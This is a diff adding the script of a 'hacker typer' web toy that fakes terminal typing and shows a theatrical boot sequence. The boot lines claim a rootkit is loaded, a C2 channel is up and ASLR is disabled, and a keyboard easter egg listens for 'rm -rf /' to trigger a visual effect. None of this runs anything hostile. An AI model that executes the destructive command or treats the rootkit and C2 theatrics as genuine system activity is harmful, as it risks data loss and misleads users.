+    S.rmBuf=(S.rmBuf+e.key).slice(-9);
+    if(S.rmBuf.endsWith('rm -rf /')){
+      document.getElementById('rmrf').classList.add('on');
+      for(let i=0;i<5;i++) setTimeout(()=>explode(Math.random()*innerWidth,Math.random()*innerHeight,getComputedStyle(document.body).getPropertyValue('--acc'),80),i*100);
+      S.rmBuf='';
+    }
+  }
+
+  if(e.key.length===1||e.key==='Backspace'){
+    typePanes(); S.keys++; updateStats2(); playKey();
+    // clear input so it doesn't accumulate
+    setTimeout(()=>{ kc.value=''; },0);
+  }
+}
+
+// ========== AUTOPILOT ==========
+function toggleAuto(){
+  S.autopilot=!S.autopilot;
+  document.getElementById('autoInd').classList.toggle('on',S.autopilot);
+  const atog=document.getElementById('sbAtog');
+  if(atog) atog.classList.toggle('on',S.autopilot);
+  if(S.autopilot){
+    S.autoTimer=setInterval(()=>{
+      typePanes(); S.keys++; updateStats2();
+      if(Math.random()<.02) spawnPopup();
+    },65);
+  } else {
+    clearInterval(S.autoTimer);
+  }
+}
+
+// ========== THEME / LANG / LAYOUT ==========
+function setTheme(t){
+  S.theme=t;
+  document.body.dataset.theme=t;
+  // update sidebar buttons
+  document.querySelectorAll('[data-t]').forEach(b=>b.classList.toggle('on',b.dataset.t===t));
+  document.querySelectorAll('[data-theme]').forEach(b=>b.classList.toggle('sel',b.dataset.theme===t));
+}
+function setLang(l){
+  S.lang=l;
+  document.getElementById('stLang').textContent=l;
+  document.querySelectorAll('[data-lang]').forEach(b=>b.classList.toggle('sel',b.dataset.lang===l));
+  syncSbLang();
+  buildLayout();
+}
+function setLayout(l){
+  S.layout=l;
+  document.querySelectorAll('[data-l]').forEach(b=>b.classList.toggle('on',b.dataset.l===l));
+  document.querySelectorAll('[data-layout]').forEach(b=>b.classList.toggle('sel',b.dataset.layout===l));
+  buildLayout();
+}
+function cycleLayout(){
+  const ls=['L1','L2','L3','L4'];
+  setLayout(ls[(ls.indexOf(S.layout)+1)%ls.length]);
+}
+
+function syncSbLang(){
+  const g=document.getElementById('sbLangGrid');
+  if(!g) return;
+  g.querySelectorAll('[data-sb-lang]').forEach(b=>b.classList.toggle('on',b.dataset.sbLang===S.lang));
+}
+function syncSbButtons(){
+  document.querySelectorAll('[data-t]').forEach(b=>b.classList.toggle('on',b.dataset.t===S.theme));
+  document.querySelectorAll('[data-l]').forEach(b=>b.classList.toggle('on',b.dataset.l===S.layout));
+  syncSbLang();
+}
+
+// ========== SIDEBAR ==========
+let sidebarOpen=true;
+function toggleSidebar(){
+  sidebarOpen=!sidebarOpen;
+  document.getElementById('sidebar').classList.toggle('off',!sidebarOpen);
+  document.getElementById('mainArea').classList.toggle('full',!sidebarOpen);
+  document.getElementById('sbTog').classList.toggle('off',!sidebarOpen);
+  document.getElementById('sbTog').textContent=sidebarOpen?'≡':'→';
+}
+
+// ========== FULLSCREEN ==========
+function toggleFS(){
+  if(!document.fullscreenElement) document.documentElement.requestFullscreen?.().catch(()=>{});
+  else document.exitFullscreen?.().catch(()=>{});
+}
+
+// ========== STATS ==========
+function updateStats2(){
+  document.getElementById('stKeys').textContent=S.keys;
+}
+function updateClock(){
+  const now=new Date(), pad=n=>String(n).padStart(2,'0');
+  document.getElementById('clk').textContent=`${pad(now.getUTCHours())}:${pad(now.getUTCMinutes())}:${pad(now.getUTCSeconds())}`;
+  const el=Math.floor((Date.now()-S.start)/1000);
+  document.getElementById('stUp').textContent=`${pad(Math.floor(el/60))}:${pad(el%60)}`;
+  document.getElementById('cpu').textContent=(12+Math.random()*60).toFixed(0)+'%';
+  document.getElementById('mem').textContent=(35+Math.random()*25).toFixed(1)+'%';
+}
+setInterval(updateClock,1000);
+
+// ========== QR ==========
+function genQR(seed){
+  let svg='';
+  const finder=(x,y)=>`<rect x="${x}" y="${y}" width="42" height="42" fill="black"/><rect x="${x+6}" y="${y+6}" width="30" height="30" fill="white"/><rect x="${x+12}" y="${y+12}" width="18" height="18" fill="black"/>`;
+  svg+=finder(10,10)+finder(148,10)+finder(10,148);
+  let h=0; for(let i=0;i<seed.length;i++) h=(h*31+seed.charCodeAt(i))|0;
+  for(let r=0;r<30;r++) for(let c=0;c<30;c++){
+    const x=10+c*6,y=10+r*6;
+    if((r<7&&c<7)||(r<7&&c>22)||(r>22&&c<7)) continue;
+    h=(h*1103515245+12345)|0;
+    if(h&1) svg+=`<rect x="${x}" y="${y}" width="6" height="6" fill="black"/>`;
+  }
+  svg+=`<text x="100" y="195" text-anchor="middle" font-family="monospace" font-size="6" fill="#333">REPLACE WITH YOUR QR</text>`;
+  return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="200" height="200"><rect width="200" height="200" fill="white"/>${svg}</svg>`;
+}
+function showQR(){
+  document.getElementById('qrImg').innerHTML=genQR(DONATE_URL);
+  document.getElementById('qrOv').classList.add('on');
+}
+function hideQR(){ document.getElementById('qrOv').classList.remove('on'); }
+document.getElementById('qrOv').addEventListener('click',e=>{ if(e.target.id==='qrOv') hideQR(); });
+
+// ========== SCREEN MANAGER ==========
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  const s=document.getElementById(id);
+  s.classList.add('active');
+  if(id==='typerScreen'){
+    // Focus the hidden input — this is the KEY fix
+    setTimeout(()=>focusInput(), 100);
+  }
+}
+
+// ========== INTRO WIRING ==========
+function wireIntro(){
+  // lang buttons
+  document.querySelectorAll('#langGrid .opt-btn').forEach(b=>{
+    b.addEventListener('click',()=>{
+      document.querySelectorAll('#langGrid .opt-btn').forEach(x=>x.classList.remove('sel'));
+      b.classList.add('sel');
+      S.lang=b.dataset.lang;
+    });
+  });
+  // theme buttons
+  document.querySelectorAll('#themeGrid .opt-btn').forEach(b=>{
+    b.addEventListener('click',()=>{
+      document.querySelectorAll('#themeGrid .opt-btn').forEach(x=>x.classList.remove('sel'));
+      b.classList.add('sel');
+      setTheme(b.dataset.theme);
+    });
+  });
+  // layout buttons
+  document.querySelectorAll('#layoutGrid .opt-btn').forEach(b=>{
+    b.addEventListener('click',()=>{
+      document.querySelectorAll('#layoutGrid .opt-btn').forEach(x=>x.classList.remove('sel'));
+      b.classList.add('sel');
+      S.layout=b.dataset.layout;
+    });
+  });
+  // speed
+  const spd=document.getElementById('cfgSpeed');
+  spd.addEventListener('input',()=>{
+    S.speed=parseInt(spd.value);
+    document.getElementById('cfgSpeedLbl').textContent=S.speed;
+  });
+  // toggles
+  document.getElementById('cfgSound').addEventListener('click',function(){
+    S.sound=!S.sound; this.classList.toggle('on',S.sound);
+    if(S.sound) initAudio();
+  });
+  document.getElementById('cfgAuto').addEventListener('click',function(){
+    this.classList.toggle('on');
+  });
+  // launch
+  document.getElementById('launchBtn').addEventListener('click',()=>{
+    // apply auto setting
+    const autoOn=document.getElementById('cfgAuto').classList.contains('on');
+    // build sidebar lang grid
+    buildSbLangGrid();
+    buildLayout();
+    syncSbButtons();
+    showScreen('typerScreen');
+    if(autoOn) setTimeout(toggleAuto,300);
+  });
+  // donate QR in intro
+  document.getElementById('introQrWrap').innerHTML=genQR(DONATE_URL);
+}
+
+function buildSbLangGrid(){
+  const g=document.getElementById('sbLangGrid');
+  g.innerHTML='';
+  Object.keys(CODES).forEach(l=>{
+    const b=document.createElement('button');
+    b.className='sb-btn'+(l===S.lang?' on':'');
+    b.dataset.sbLang=l;
+    b.textContent=l.toUpperCase();
+    b.addEventListener('click',()=>setLang(l));
+    g.appendChild(b);
+  });
+}
+
+// sidebar theme/layout buttons in typer
+document.querySelectorAll('#sbThemeGrid [data-t]').forEach(b=>{
+  b.addEventListener('click',()=>setTheme(b.dataset.t));
+});
+document.querySelectorAll('#sbLayoutGrid [data-l]').forEach(b=>{
+  b.addEventListener('click',()=>setLayout(b.dataset.l));
+});
+
+// ========== BOOT SEQUENCE ==========
+const BOOT=[
+  {t:'[  <span class="ok">OK</span>  ] BIOS v5.2.1 — POST clear',d:30},
+  {t:'[  <span class="ok">OK</span>  ] CPU: 24 cores @ 5.2GHz',d:70},
+  {t:'[  <span class="ok">OK</span>  ] RAM: 64GB DDR5 ECC initialized',d:60},
+  {t:'[  <span class="ok">OK</span>  ] NVMe /dev/nvme0n1p1 mounted',d:90},
+  {t:'[  <span class="ok">OK</span>  ] /dev/.hidden mounted',d:70},
+  {t:'[ <span class="wn">WARN</span> ] stealth_rk.ko loaded — hiding module',d:80},
+  {t:'[  <span class="ok">OK</span>  ] tor service started',d:60},
+  {t:'[  <span class="ok">OK</span>  ] darknet relay active',d:80},
+  {t:'[  <span class="ok">OK</span>  ] C2 channel established',d:110},
+  {t:'[  <span class="ok">OK</span>  ] AES-256-GCM ready',d:60},
+  {t:'[ <span class="wn">WARN</span> ] ASLR disabled — kernel.randomize_va_space=0',d:90},
+  {t:'[  <span class="ok">OK</span>  ] anonymized via 7 relay nodes',d:100},
+  {t:'<span class="ok">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>',d:80},
+  {t:'<span class="ok">  N3XUS TYPER — ready</span>',d:150},
+  {t:'  loading configuration screen<span class="bcur"></span>',d:80},
+];
+function boot(){
+  const sc=document.getElementById('bootScreen');
+  let delay=0;
+  BOOT.forEach(line=>{
+    setTimeout(()=>{
+      const d=document.createElement('div');
+      d.className='bl'; d.innerHTML=line.t;
+      sc.appendChild(d); sc.scrollTop=sc.scrollHeight;
+    }, delay);
+    delay+=line.d;
+  });
+  setTimeout(()=>{
+    sc.style.animation='popOut .4s forwards';
+    setTimeout(()=>{
+      sc.classList.remove('active');
+      sc.style.display='none';
+      showScreen('introScreen');
+    },380);
+  }, delay+400);
+}
+
+// ========== INIT ==========
+window.addEventListener('load',()=>{
+  wireIntro();
+  boot();
+});
+</script>
+</body>
+</html>
